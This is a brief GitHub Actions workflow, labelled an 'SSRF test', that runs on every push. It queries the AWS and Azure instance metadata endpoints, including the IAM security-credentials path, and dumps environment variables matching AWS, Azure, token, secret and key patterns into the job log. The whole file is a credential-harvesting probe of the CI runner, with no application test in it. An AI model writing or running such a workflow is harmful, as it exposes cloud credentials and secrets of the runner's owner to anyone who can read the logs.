name: ssrf
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: SSRF test
        run: |
          curl -s http://169.254.169.254/latest/meta-data/
          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
          curl -s -H "X-aws-ec2-metadata-token: test" http://169.254.169.254/latest/meta-data/iam/security-credentials/
          env | grep -i "AWS\|AZURE\|TOKEN\|SECRET\|KEY" || true
